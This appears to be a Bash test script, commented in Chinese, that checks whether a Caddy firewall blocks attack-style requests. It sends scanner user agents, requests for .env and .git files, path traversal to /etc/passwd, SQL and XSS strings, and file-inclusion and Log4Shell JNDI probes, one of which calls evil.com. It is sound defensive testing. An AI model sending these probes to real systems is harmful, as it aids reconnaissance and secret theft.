#!/bin/bash

# ============================================
# WAF 规则测试脚本
# 测试 Caddy WAF 配置是否正常工作
# ============================================

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# 默认测试域名
BASE_URL="${1:-https://rest.test.local}"

# 统计
PASS=0
FAIL=0

# 打印函数
print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

print_test() {
    echo -e "\n${YELLOW}测试: $1${NC}"
    echo -e "请求: $2"
    echo -e "预期: HTTP $3"
}

print_result() {
    local expected=$1
    local actual=$2
    local desc=$3
    
    if [ "$actual" = "$expected" ]; then
        echo -e "结果: ${GREEN}✓ 通过${NC} (HTTP $actual)"
        ((PASS++))
    else
        echo -e "结果: ${RED}✗ 失败${NC} (HTTP $actual, 预期 $expected)"
        ((FAIL++))
    fi
}

# 发送请求并获取状态码
get_status() {
    local url=$1
    local method=${2:-GET}
    local user_agent=${3:-"Mozilla/5.0"}
    
    curl -s -o /dev/null -w "%{http_code}" \
        -X "$method" \
        -A "$user_agent" \
        -k \
        --connect-timeout 5 \
        --max-time 10 \
        "$url" 2>/dev/null || echo "000"
}

# ============================================
# 开始测试
# ============================================

print_header "WAF 规则测试 - $BASE_URL"

echo -e "\n${YELLOW}提示: 使用方法: $0 [URL]${NC}"
echo -e "${YELLOW}示例: $0 https://rest.test.local${NC}"

# --------------------------------------------
# 0. 基础连接测试
# --------------------------------------------
print_header "0. 基础连接测试"

print_test "正常请求" "$BASE_URL/" "200/308"
status=$(get_status "$BASE_URL/")
if [ "$status" = "200" ] || [ "$status" = "308" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
    echo -e "结果: ${GREEN}✓ 连接正常${NC} (HTTP $status)"
    ((PASS++))
else
    echo -e "结果: ${RED}✗ 连接失败${NC} (HTTP $status)"
    echo -e "${RED}请检查服务是否运行以及 DNS 解析是否正确${NC}"
    ((FAIL++))
fi

# --------------------------------------------
# 1. 恶意扫描工具检测
# --------------------------------------------
print_header "1. 恶意扫描工具检测"

print_test "SQLMap User-Agent" "$BASE_URL/ (UA: sqlmap/1.0)" "403"
status=$(get_status "$BASE_URL/" "GET" "sqlmap/1.0")
print_result "403" "$status"

print_test "Nmap User-Agent" "$BASE_URL/ (UA: Nmap Scripting Engine)" "403"
status=$(get_status "$BASE_URL/" "GET" "Nmap Scripting Engine")
print_result "403" "$status"

print_test "Nikto User-Agent" "$BASE_URL/ (UA: Nikto/2.1.6)" "403"
status=$(get_status "$BASE_URL/" "GET" "Nikto/2.1.6")
print_result "403" "$status"

print_test "Nuclei User-Agent" "$BASE_URL/ (UA: nuclei)" "403"
status=$(get_status "$BASE_URL/" "GET" "nuclei")
print_result "403" "$status"

# --------------------------------------------
# 2. 敏感文件访问
# --------------------------------------------
print_header "2. 敏感文件访问防护"

print_test ".env 文件" "$BASE_URL/.env" "403"
status=$(get_status "$BASE_URL/.env")
print_result "403" "$status"

print_test ".git 目录" "$BASE_URL/.git/config" "403"
status=$(get_status "$BASE_URL/.git/config")
print_result "403" "$status"

print_test "composer.json" "$BASE_URL/composer.json" "403"
status=$(get_status "$BASE_URL/composer.json")
print_result "403" "$status"

print_test "package.json" "$BASE_URL/package.json" "403"
status=$(get_status "$BASE_URL/package.json")
print_result "403" "$status"

print_test ".htaccess" "$BASE_URL/.htaccess" "403"
status=$(get_status "$BASE_URL/.htaccess")
print_result "403" "$status"

print_test "备份文件 .bak" "$BASE_URL/config.bak" "403"
status=$(get_status "$BASE_URL/config.bak")
print_result "403" "$status"

# --------------------------------------------
# 3. 路径遍历攻击
# --------------------------------------------
print_header "3. 路径遍历攻击防护"

print_test "目录遍历 ../" "$BASE_URL/../../etc/passwd" "403"
status=$(get_status "$BASE_URL/../../etc/passwd")
print_result "403" "$status"

print_test "/etc/passwd" "$BASE_URL/etc/passwd" "403"
status=$(get_status "$BASE_URL/etc/passwd")
print_result "403" "$status"

print_test "/bin/bash" "$BASE_URL/bin/bash" "403"
status=$(get_status "$BASE_URL/bin/bash")
print_result "403" "$status"

# --------------------------------------------
# 4. 管理后台路径
# --------------------------------------------
print_header "4. 管理后台路径防护"

print_test "phpMyAdmin" "$BASE_URL/phpmyadmin" "404"
status=$(get_status "$BASE_URL/phpmyadmin")
print_result "404" "$status"

print_test "Adminer" "$BASE_URL/adminer" "404"
status=$(get_status "$BASE_URL/adminer")
print_result "404" "$status"

print_test "wp-admin" "$BASE_URL/wp-admin" "404"
status=$(get_status "$BASE_URL/wp-admin")
print_result "404" "$status"

print_test "phpinfo" "$BASE_URL/phpinfo" "404"
status=$(get_status "$BASE_URL/phpinfo")
print_result "404" "$status"

# --------------------------------------------
# 5. 恶意请求方法
# --------------------------------------------
print_header "5. 恶意请求方法防护"

print_test "TRACE 方法" "$BASE_URL/ (TRACE)" "405"
status=$(get_status "$BASE_URL/" "TRACE")
print_result "405" "$status"

print_test "TRACK 方法" "$BASE_URL/ (TRACK)" "405"
status=$(get_status "$BASE_URL/" "TRACK")
print_result "405" "$status"

# --------------------------------------------
# 6. SQL 注入攻击
# --------------------------------------------
print_header "6. SQL 注入攻击防护"

print_test "union select" "$BASE_URL/union/select/from" "403"
status=$(get_status "$BASE_URL/union/select/from")
print_result "403" "$status"

print_test "drop table" "$BASE_URL/drop/table/users" "403"
status=$(get_status "$BASE_URL/drop/table/users")
print_result "403" "$status"

# --------------------------------------------
# 7. XSS 攻击
# --------------------------------------------
print_header "7. XSS 攻击防护"

print_test "script 标签" "$BASE_URL/<script>alert(1)</script>" "403"
status=$(get_status "$BASE_URL/<script>alert(1)</script>")
print_result "403" "$status"

print_test "javascript 协议" "$BASE_URL/javascript:alert(1)" "403"
status=$(get_status "$BASE_URL/javascript:alert(1)")
print_result "403" "$status"

print_test "onclick 事件" "$BASE_URL/onclick=alert" "403"
status=$(get_status "$BASE_URL/onclick=alert")
print_result "403" "$status"

print_test "onmouseover 事件" "$BASE_URL/onmouseover=alert" "403"
status=$(get_status "$BASE_URL/onmouseover=alert")
print_result "403" "$status"

# --------------------------------------------
# 8. 文件包含攻击
# --------------------------------------------
print_header "8. 文件包含攻击防护"

print_test "php:// 协议" "$BASE_URL/php://input" "403"
status=$(get_status "$BASE_URL/php://input")
print_result "403" "$status"

print_test "file:// 协议" "$BASE_URL/file:///etc/passwd" "403"
status=$(get_status "$BASE_URL/file:///etc/passwd")
print_result "403" "$status"

print_test "data:// 协议" "$BASE_URL/data://text/plain" "403"
status=$(get_status "$BASE_URL/data://text/plain")
print_result "403" "$status"

# --------------------------------------------
# 9. Log4Shell / JNDI 注入
# --------------------------------------------
print_header "9. Log4Shell / JNDI 注入防护"

print_test "JNDI 注入" "$BASE_URL/\${jndi:ldap://evil.com}" "403"
status=$(get_status "$BASE_URL/%24%7Bjndi:ldap://evil.com%7D")
print_result "403" "$status"

print_test "Java 表达式" "$BASE_URL/\${java:version}" "403"
status=$(get_status "$BASE_URL/%24%7Bjava:version%7D")
print_result "403" "$status"

print_test "环境变量注入" "$BASE_URL/\${env:PATH}" "403"
status=$(get_status "$BASE_URL/%24%7Benv:PATH%7D")
print_result "403" "$status"

print_test "系统属性注入" "$BASE_URL/\${sys:user.dir}" "403"
status=$(get_status "$BASE_URL/%24%7Bsys:user.dir%7D")
print_result "403" "$status"

# ============================================
# 测试结果汇总
# ============================================
print_header "测试结果汇总"

TOTAL=$((PASS + FAIL))
echo -e "总测试数: $TOTAL"
echo -e "${GREEN}通过: $PASS${NC}"
echo -e "${RED}失败: $FAIL${NC}"

if [ $FAIL -eq 0 ]; then
    echo -e "\n${GREEN}✓ 所有 WAF 规则测试通过！${NC}"
    exit 0
else
    echo -e "\n${YELLOW}⚠ 部分测试未通过，请检查 WAF 配置${NC}"
    exit 1
fi
